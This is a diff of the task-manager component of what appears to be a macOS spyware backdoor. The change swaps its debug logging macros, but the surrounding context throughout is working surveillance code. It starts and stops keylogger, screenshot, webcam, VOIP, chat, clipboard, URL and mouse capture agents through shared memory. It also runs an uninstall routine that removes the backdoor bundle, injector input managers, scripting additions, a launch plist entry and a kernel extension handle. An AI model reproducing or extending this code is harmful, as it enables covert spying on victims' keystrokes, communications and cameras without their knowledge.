@@ -25,10 +25,9 @@
 #import "RCSMLogManager.h"
 #import "RCSMActions.h"
 #import "RCSMEvents.h"
-#import "RCSMCommon.h"
 
-//#define DEBUG
-//#define NO_START_AT_LAUNCH
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 static RCSMTaskManager *sharedTaskManager = nil;
@@ -179,8 +178,8 @@ static NSLock *gSyncLock                  = nil;
       [self startAgents];
 #endif
       
-#ifdef DEBUG
-      NSLog(@"All Agents started");
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"All Agents started");
 #endif
       
       //
@@ -195,8 +194,8 @@ static NSLock *gSyncLock                  = nil;
     }
   else
     {
-#ifdef DEBUG_ERRORS
-      NSLog(@"An error occurred while loading the configuration file");
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"An error occurred while loading the configuration file");
 #endif
 
       exit(-1);
@@ -209,8 +208,8 @@ static NSLock *gSyncLock                  = nil;
 
 - (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData
 {
-#ifdef DEBUG
-  NSLog(@"Writing new configuration");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Writing new configuration");
 #endif
   
   NSString *configurationPath = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -232,8 +231,8 @@ static NSLock *gSyncLock                  = nil;
   
   if ([mConfigManager checkConfigurationIntegrity: configurationUpdatePath])
     {
-#ifdef DEBUG
-      NSLog(@"checkConfigurationIntegrity went ok");
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"checkConfigurationIntegrity went ok");
 #endif
       
       //
@@ -257,8 +256,8 @@ static NSLock *gSyncLock                  = nil;
         }
       else
         {
-#ifdef DEBUG
-          NSLog(@"Error while removing config name");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Error while removing config name");
 #endif
         }
     }
@@ -288,14 +287,14 @@ static NSLock *gSyncLock                  = nil;
       //
       if ([self stopEvents] == TRUE)
         {
-#ifdef DEBUG
-          NSLog(@"Events stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Events stopped correctly");
 #endif
           
           if ([self stopAgents] == TRUE)
             {
-#ifdef DEBUG
-              NSLog(@"Agents stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Agents stopped correctly");
 #endif
               
               //
@@ -322,8 +321,8 @@ static NSLock *gSyncLock                  = nil;
               else
                 {
                   // previous one
-#ifdef DEBUG_ERRORS
-                  NSLog(@"An error occurred while reloading the configuration file");
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"An error occurred while reloading the configuration file");
 #endif
                   
                   return NO;
@@ -341,34 +340,38 @@ static NSLock *gSyncLock                  = nil;
   mBackdoorControlFlag = @"STOP";
   [gControlFlagLock unlock];
   
-#ifdef DEBUG
-  NSLog(@"Action Uninstall started!");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Action Uninstall started!");
 #endif
   
   BOOL lckRet = NO;
   lckRet = [gSuidLock lockBeforeDate: [NSDate dateWithTimeIntervalSinceNow: 60]];
   
-#ifdef DEBUG
+#ifdef DEBUG_TASK_MANAGER
   if (lckRet == NO) 
-    NSLog(@"%s: enter critical session with timeout [euid/uid %d/%d]", 
-          __FUNCTION__, geteuid(), getuid());
-  else 
-    NSLog(@"%s: enter critical session normaly [euid/uid %d/%d]", 
-          __FUNCTION__, geteuid(), getuid());
+    {
+      infoLog(@"%s: enter critical session with timeout [euid/uid %d/%d]", 
+              __FUNCTION__, geteuid(), getuid());
+    }
+  else
+    {
+      infoLog(@"%s: enter critical session normaly [euid/uid %d/%d]", 
+              __FUNCTION__, geteuid(), getuid());
+    }
 #endif
 
   /*if ([self stopEvents] == TRUE)
   //if (1)
     {
-#ifdef DEBUG
-      NSLog(@"Events stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+      infoLog(@"Events stopped correctly");
 #endif
       
       if ([self stopAgents] == TRUE)
       //if (2)
         {
-#ifdef DEBUG
-          NSLog(@"Agents stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Agents stopped correctly");
 #endif*/
           
           /*
@@ -383,30 +386,30 @@ static NSLock *gSyncLock                  = nil;
           
           for (NSString *logFile in logFiles)
             {
-#ifdef DEBUG
-              NSLog(@"Removing log: %@", logFile);
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Removing log: %@", logFile);
 #endif
               [[NSFileManager defaultManager] removeItemAtPath: logFile
                                                          error: nil];
             }
           */
           
-#ifdef DEBUG
-          infoLog(ME, @"Uninstall called");
-          infoLog(ME, @"Closing active logs");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Uninstall called");
+          infoLog(@"Closing active logs");
 #endif
           
           RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
           if ([_logManager closeActiveLogsAndContinueLogging: NO])
             {
 #ifdef DEBUF
-              infoLog(ME, @"Active logs closed correctly");
+              infoLog(@"Active logs closed correctly");
 #endif
             }
           else
             {
-#ifdef DEBUG
-              errorLog(ME, @"An error occurred while closing active logs");
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"An error occurred while closing active logs");
 #endif
             }
           
@@ -450,8 +453,8 @@ static NSLock *gSyncLock                  = nil;
                   
                   if (gOSMajor == 10 && gOSMinor == 6) 
                     {
-#ifdef DEBUG
-                      infoLog(ME, @"Removing scripting additions");
+#ifdef DEBUG_TASK_MANAGER
+                      infoLog(@"Removing scripting additions");
 #endif
                       destDir = [[NSString alloc]
                                     initWithFormat: @"/Library/ScriptingAdditions/%@",
@@ -459,8 +462,8 @@ static NSLock *gSyncLock                  = nil;
                     }
                   else if (gOSMajor == 10 && gOSMinor == 5) 
                     {
-#ifdef DEBUG
-                      infoLog(ME, @"Removing input manager");
+#ifdef DEBUG_TASK_MANAGER
+                      infoLog(@"Removing input manager");
 #endif
                       destDir = [[NSString alloc]
                                            initWithFormat: @"/Library/InputManagers/%@",
@@ -472,11 +475,11 @@ static NSLock *gSyncLock                  = nil;
                   if (![[NSFileManager defaultManager] removeItemAtPath: destDir
                                                                   error: &err])
                     {
-#ifdef DEBUG
-                      NSLog(@"uid  = %d", getuid());
-                      NSLog(@"euid = %d\n", geteuid());
-                      NSLog(@"Error while removing the input manager");
-                      NSLog(@"error: %@", [err localizedDescription]);
+#ifdef DEBUG_TASK_MANAGER
+                      infoLog(@"uid  = %d", getuid());
+                      infoLog(@"euid = %d\n", geteuid());
+                      infoLog(@"Error while removing the input manager");
+                      infoLog(@"error: %@", [err localizedDescription]);
 #endif
                     }
                   
@@ -484,20 +487,20 @@ static NSLock *gSyncLock                  = nil;
                 }
               else
                 {
-#ifdef DEBUG
-                  infoLog(ME, @"I don't have privileges for removing the input manager :(");
-                  infoLog(ME, @"uid (%d) euid (%d)", getuid(), geteuid());
+#ifdef DEBUG_TASK_MANAGER
+                  infoLog(@"I don't have privileges for removing the input manager :(");
+                  infoLog(@"uid (%d) euid (%d)", getuid(), geteuid());
 #endif
                 }
             }
           else
             {
-#ifdef DEBUG
-              warnLog(ME, @"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
+#ifdef DEBUG_TASK_MANAGER
+              warnLog(@"Won't remove injector, there are still registered backdoors (%d)", activeBackdoors);
 #endif
             }
-#ifdef DEBUG
-          NSLog(@"Removing SLI Plist just in case");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Removing SLI Plist just in case");
 #endif
           [gUtil removeBackdoorFromSLIPlist];
           
@@ -507,14 +510,14 @@ static NSLock *gSyncLock                  = nil;
           if ([[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
                                                          error: nil])
             {
-#ifdef DEBUG
-              NSLog(@"Backdoor dir removed correctly");
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Backdoor dir removed correctly");
 #endif
             }
           else
             {
-#ifdef DEBUG
-              NSLog(@"An error occurred while removing backdoor dir");
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"An error occurred while removing backdoor dir");
 #endif
             }
           
@@ -525,8 +528,8 @@ static NSLock *gSyncLock                  = nil;
 #endif
           
           // Unregister uspace component
-#ifdef DEBUG
-          infoLog(ME, @"Unregistering uspace components");
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Unregistering uspace components");
 #endif
 
           close(kextFD);
@@ -548,8 +551,8 @@ static NSLock *gSyncLock                  = nil;
         
           [gSuidLock unlock];
   
-#ifdef DEBUG
-    NSLog(@"%s: exit critical session [euid/uid %d/%d]", 
+#ifdef DEBUG_TASK_MANAGER
+    infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
           __FUNCTION__, geteuid(), getuid());
 #endif
           exit(0);
@@ -578,8 +581,8 @@ static NSLock *gSyncLock                  = nil;
     {
     case AGENT_SCREENSHOT:
       {
-#ifdef DEBUG
-        NSLog(@"Starting Agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Screenshot");
 #endif
         RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
@@ -598,15 +601,15 @@ static NSLock *gSyncLock                  = nil;
               }
             else
               {
-#ifdef DEBUG
-                NSLog(@"Agent Screenshot is already running");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Agent Screenshot is already running");
 #endif
               }
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Agent not found");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent not found");
 #endif
 
             return FALSE;
@@ -616,16 +619,16 @@ static NSLock *gSyncLock                  = nil;
 #if 0
     case AGENT_ORGANIZER:
       {
-#ifdef DEBUG
-        NSLog(@"Starting Agent Organizer");
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Organizer");
 #endif
         RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if (agentConfiguration == nil)
           {
-#ifdef DEBUG
-            errorLog(ME, @"Internal config for agent Organizer not found");
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Internal config for agent Organizer not found");
 #endif
             return FALSE;
           }
@@ -643,8 +646,8 @@ static NSLock *gSyncLock                  = nil;
 #endif
     case AGENT_CAM:
       {   
-#ifdef DEBUG
-        NSLog(@"Starting Agent Webcam");
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent Webcam");
 #endif
         RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
         
@@ -663,8 +666,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Agent Webcam is already running");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Agent Webcam is already running");
 #endif
           }
         break;
@@ -682,8 +685,8 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command   = AG_START;
             
-#ifdef DEBUG
-            NSLog(@"Creating KEYLOG Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Creating KEYLOG Agent log file");
 #endif
             BOOL success = [_logManager createLog: AGENT_KEYLOG
                                       agentHeader: nil
@@ -691,22 +694,22 @@ static NSLock *gSyncLock                  = nil;
             
             if (success == TRUE)
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Keylogger");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Keylogger");
 #endif
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_KEYLOG
                                         fromComponent: COMP_CORE] == TRUE)
                   {
                     [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent Keylog", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent Keylog", agentID);
 #endif
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"Error while sending start command to the agent");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Error while sending start command to the agent");
 #endif
                     
                     [agentCommand release];
@@ -719,8 +722,8 @@ static NSLock *gSyncLock                  = nil;
       }
     case AGENT_URL:
       {
-#ifdef DEBUG
-        NSLog(@"Starting Agent URL");
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Starting Agent URL");
 #endif
         agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
@@ -733,8 +736,8 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command = AG_START;
             
-#ifdef DEBUG
-            NSLog(@"Creating URL Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Creating URL Agent log file");
 #endif
             BOOL success = [_logManager createLog: AGENT_URL
                                       agentHeader: nil
@@ -749,14 +752,14 @@ static NSLock *gSyncLock                  = nil;
                     [agentConfiguration setObject: AGENT_RUNNING
                                            forKey: @"status"];
                     
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent URL", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent URL", agentID);
 #endif
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while starting agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent URL");
 #endif
                     
                     [agentCommand release];
@@ -797,24 +800,24 @@ static NSLock *gSyncLock                  = nil;
                                            offset: 0
                                     fromComponent: COMP_CORE] == TRUE)
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Mouse");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Mouse");
 #endif
                 
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_MOUSE
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent Mouse", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent Mouse", agentID);
 #endif
                     [agentConfiguration setObject: AGENT_RUNNING
                                            forKey: @"status"];
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while starting agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent URL");
 #endif
                     
                     [agentCommand release];
@@ -837,8 +840,8 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command   = AG_START;
             
-#ifdef DEBUG
-            NSLog(@"Creating CHAT Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Creating CHAT Agent log file");
 #endif
             BOOL success = [_logManager createLog: AGENT_CHAT
                                       agentHeader: nil
@@ -850,16 +853,16 @@ static NSLock *gSyncLock                  = nil;
                                                offset: OFFT_IM
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent CHAT", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent CHAT", agentID);
 #endif
                     [agentConfiguration setObject: AGENT_RUNNING
                                            forKey: @"status"];
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while starting agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent URL");
 #endif
                     
                     [agentCommand release];
@@ -883,30 +886,30 @@ static NSLock *gSyncLock                  = nil;
             shMemoryHeader->agentID         = agentID;
             shMemoryHeader->direction       = D_TO_AGENT;
             shMemoryHeader->command         = AG_START;
-#ifdef DEBUG
-            NSLog(@"Creating CLIPBOARD Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Creating CLIPBOARD Agent log file");
 #endif
             BOOL success = [_logManager createLog: AGENT_CLIPBOARD
                                       agentHeader: nil
                                         withLogID: 0];
             if (success == TRUE)
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Clipboard");
 #endif
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_CLIPBOARD
                                         fromComponent: COMP_CORE] == TRUE)
                   {
                     [agentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent Clipboard", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent Clipboard", agentID);
 #endif
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"Error while sending start command to the agent");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Error while sending start command to the agent");
 #endif
                     
                     [agentCommand release];
@@ -952,24 +955,24 @@ static NSLock *gSyncLock                  = nil;
                                            offset: 0
                                     fromComponent: COMP_CORE] == TRUE)
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Voip - conf sent");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Voip - conf sent");
 #endif
                 
                 if ([gSharedMemoryCommand writeMemory: agentCommand
                                                offset: OFFT_VOIP
                                         fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Start command sent to Agent Voip", agentID);
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Start command sent to Agent Voip", agentID);
 #endif
                     [agentConfiguration setObject: AGENT_RUNNING
                                            forKey: @"status"];
                   }
                 else
                   {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while starting agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"An error occurred while starting agent URL");
 #endif
                     
                     [agentCommand release];
@@ -986,8 +989,8 @@ static NSLock *gSyncLock                  = nil;
       }
     default:
       {
-#ifdef DEBUG
-        NSLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
 #endif
         
         return NO;
@@ -1024,23 +1027,23 @@ static NSLock *gSyncLock                  = nil;
   NSMutableDictionary *agentConfiguration;
   NSData *agentCommand;
   
-#ifdef DEBUG
-  NSLog(@"Stop Agent called, 0x%x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Stop Agent called, 0x%x", agentID);
 #endif
   
   switch (agentID)
     {
     case AGENT_SCREENSHOT:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent Screenshot");
 #endif
         RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
         
         if ([agentScreenshot stop] == FALSE)
           {
-#ifdef DEBUG_ERRORS
-            NSLog(@"Error while stopping agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while stopping agent Screenshot");
 #endif
             return NO;
           }
@@ -1053,15 +1056,15 @@ static NSLock *gSyncLock                  = nil;
 #if 0
     case AGENT_ORGANIZER:
       {
-#ifdef DEBUG        
-        warnLog(ME, @"Stopping Agent Organizer");
+#ifdef DEBUG_TASK_MANAGER        
+        warnLog(@"Stopping Agent Organizer");
 #endif
         RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
       
         if ([agentOrganizer stop] == FALSE)
           {
-#ifdef DEBUG
-            errorLog(ME, @"Error while stopping agent Organizer");
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Error while stopping agent Organizer");
 #endif
             return NO;
           }
@@ -1069,23 +1072,23 @@ static NSLock *gSyncLock                  = nil;
         agentConfiguration = [self getConfigForAgent: agentID];
         [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
         
-#ifdef DEBUG
-        infoLog(ME, @"Organizer stopped correctly");
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"Organizer stopped correctly");
 #endif
         break;
       }
 #endif
     case AGENT_CAM:
       {
-#ifdef DEBUG        
-        NSLog(@"Stopping Agent WebCam");
+#ifdef DEBUG_TASK_MANAGER        
+        infoLog(@"Stopping Agent WebCam");
 #endif
         RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
         
         if ([agentWebcam stop] == FALSE)
           {
-#ifdef DEBUG_ERRORS
-            NSLog(@"Error while stopping agent Webcam");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while stopping agent Webcam");
 #endif
             return NO;
           }
@@ -1108,8 +1111,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_KEYLOG
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1120,8 +1123,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop command to Agent Keylog");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop command to Agent Keylog");
 #endif
             
             return NO;
@@ -1142,8 +1145,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_VOIP
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1151,8 +1154,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop command to agent VOIP");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop command to agent VOIP");
 #endif
 
             return NO;
@@ -1175,8 +1178,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_URL
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1187,8 +1190,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop command to Agent URL");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop command to Agent URL");
 #endif
 
             return NO;
@@ -1209,8 +1212,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_MOUSE
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1218,8 +1221,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop commmand to Agent Mouse");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop commmand to Agent Mouse");
 #endif
 
             return NO;
@@ -1240,8 +1243,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_IM
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
             
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1252,8 +1255,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop command to agent CHAT");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop command to agent CHAT");
 #endif
 
             return NO;
@@ -1274,8 +1277,8 @@ static NSLock *gSyncLock                  = nil;
                                        offset: OFFT_CLIPBOARD
                                 fromComponent: COMP_CORE] == TRUE)
           {
-#ifdef DEBUG
-            NSLog(@"Stop command sent to Agent %x", agentID);
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Stop command sent to Agent %x", agentID);
 #endif
         
             agentConfiguration = [self getConfigForAgent: agentID];
@@ -1286,8 +1289,8 @@ static NSLock *gSyncLock                  = nil;
           }
         else
           {
-#ifdef DEBUG
-            NSLog(@"Error while sending Stop command to agent Clipboard");
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Error while sending Stop command to agent Clipboard");
 #endif
 
             return NO;
@@ -1297,8 +1300,8 @@ static NSLock *gSyncLock                  = nil;
       }
     default:
       {
-#ifdef DEBUG
-        NSLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
+#ifdef DEBUG_TASK_MANAGER
+        infoLog(@"%s Unsupported agent: 0x%04x", __FUNCTION__, agentID);
 #endif
         
         return NO;
@@ -1313,8 +1316,8 @@ static NSLock *gSyncLock                  = nil;
   NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
   RCSMLogManager    *_logManager  = [RCSMLogManager sharedInstance];
   
-#ifdef DEBUG
-  NSLog(@"Start all Agents called");
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Start all Agents called");
 #endif
 
   NSData *agentCommand;
@@ -1338,8 +1341,8 @@ static NSLock *gSyncLock                  = nil;
             {
             case AGENT_SCREENSHOT:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Screenshot");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Screenshot");
 #endif
                 RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
@@ -1347,8 +1350,8 @@ static NSLock *gSyncLock                  = nil;
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config not found");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1367,8 +1370,8 @@ static NSLock *gSyncLock                  = nil;
 #if 0
             case AGENT_ORGANIZER:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Organizer");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Organizer");
 #endif
                 RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
@@ -1386,8 +1389,8 @@ static NSLock *gSyncLock                  = nil;
 #endif
             case AGENT_CAM:
               {   
-#ifdef DEBUG
-                NSLog(@"Starting Agent Webcam");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Webcam");
 #endif
                 RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
@@ -1395,8 +1398,8 @@ static NSLock *gSyncLock                  = nil;
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config not found");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1414,8 +1417,8 @@ static NSLock *gSyncLock                  = nil;
               }                
             case AGENT_KEYLOG:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Keylogger");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent Keylogger");
 #endif
                 agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                 
@@ -1424,8 +1427,8 @@ static NSLock *gSyncLock                  = nil;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_START;
                 
-#ifdef DEBUG
-                NSLog(@"Creating KEYLOG Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Creating KEYLOG Agent log file");
 #endif
                 BOOL success = [_logManager createLog: AGENT_KEYLOG
                                           agentHeader: nil
@@ -1439,14 +1442,14 @@ static NSLock *gSyncLock                  = nil;
                       {
                         [anObject setObject: AGENT_RUNNING
                                      forKey: @"status"];
-#ifdef DEBUG
-                        NSLog(@"Start command sent to Agent Keylog");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Start command sent to Agent Keylog");
 #endif
                       }
                     else
                       {
-#ifdef DEBUG
-                        NSLog(@"Error while sending start command to the agent");
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Error while sending start command to the agent");
 #endif
                       }
                   }
@@ -1455,8 +1458,8 @@ static NSLock *gSyncLock                  = nil;
               }
             case AGENT_URL:
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent URL");
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting Agent URL");
 #endif
                 agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
@@ -1464,8 +1467,8 @@ static NSLock *gSyncLock                  = nil;
                 if ([agentConfiguration isKindOfClass: [NSString class]])
                   {
                     // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config not found");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1476,8 +1479,8 @@ static NSLock *gSyncLock                  = nil;
                     shMemoryHeader->direction       = D_TO_AGENT;
                     shMemoryHeader->command         = AG_START;
                     
-#ifdef DEBUG
-                    NSLog(@"Creating URL Agent log file");
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Creating URL Agent log file");
 #endif
